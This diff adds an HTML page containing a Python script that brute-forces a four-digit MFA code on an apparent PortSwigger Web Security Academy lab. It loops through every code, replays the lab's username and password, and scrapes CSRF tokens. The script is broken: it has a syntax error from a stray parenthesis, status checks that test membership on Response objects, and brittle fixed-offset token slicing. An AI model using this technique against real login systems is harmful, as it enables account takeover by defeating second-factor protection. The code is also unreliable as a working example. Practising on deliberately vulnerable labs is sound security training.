@@ -1,0 +1,74 @@
+<!doctype html>
+<html>
+
+<code><pre>
+
+#IMPORTS
+import requests
+from bs4 import BeautifulSoup
+
+#VARIABLES, etc
+#paths are currently hardcoded
+#paths = ["login","login2"]
+
+print("Open this script and edit the subdomain for the Portswigger lab. e.g.ac401f811e0a973280e15cd400430027 or acde1fc61edd3114803607a5000300f3")
+
+#
+#portswigger_lab_subdomain = input("Enter the subdomain for this lab: ")
+session = requests.Session()
+
+
+#start the '10000' request loop to brute mfa-code
+for i in range(10000):
+  #GET @ /LOGIN
+  s =  session.get("https://ac401f811e0a973280e15cd400430027.web-security-academy.net/login")
+
+  #check status
+  if('200' in s):
+    print("Incorrect PIN code: "+str(i))
+  elif('302' in s):
+    print("Redirected! PIN found: " + str(i))
+  else:
+    print("Status code: " + s)
+
+  #PREP RESPONSE FOR PARSING
+  s_soup=BeautifulSoup(s.text,"html.parser")
+
+  #GRAB CSRF TOKEN HIDDEN INPUT
+  s_csrf_token = str(s_soup.find("input"))[52:-3]
+
+  #POST USERNAME & PASSWORD @ /LOGIN
+  s1 = session.post("https://ac401f811e0a973280e15cd400430027.web-security-academy.net/login",data={"username":"carlos","password":"montoya","csrf":s_csrf_token})
+
+  #check status
+  if('200' in s1):
+    print("Incorrect PIN code: "+str(i))
+  elif('302' in s1):
+    print("Redirected! PIN found: " + str(i))
+  else:
+    print("Status code: " + s1)
+
+  #CHECK RESPONSE. 200 IS SUCCESS.
+  #s1
+  #<Response [200]>
+
+  #s1 soup
+  s1_soup = BeautifulSoup(s1.text,"html.parser")
+
+  #s1 token
+  s1_csrf_token = str(s1_soup.find("input"))[52:-3]
+
+  #POST MFA-CODE & s1 token @ /LOGIN2
+  s2 = session.post("https://ac401f811e0a973280e15cd400430027.web-security-academy.net/login2"),data={"csrf":s1_csrf_token,"mfa-code":str(i).zfill(4)})
+ 
+  #check status 
+  if('200' in s2):
+    print("Incorrect PIN code: "+str(i))
+  elif('302' in s2):
+    print("Redirected! PIN found: " + str(i))
+  else:
+    print("Status code: " + s2)
+
+</pre></code>
+</body>
+</html>
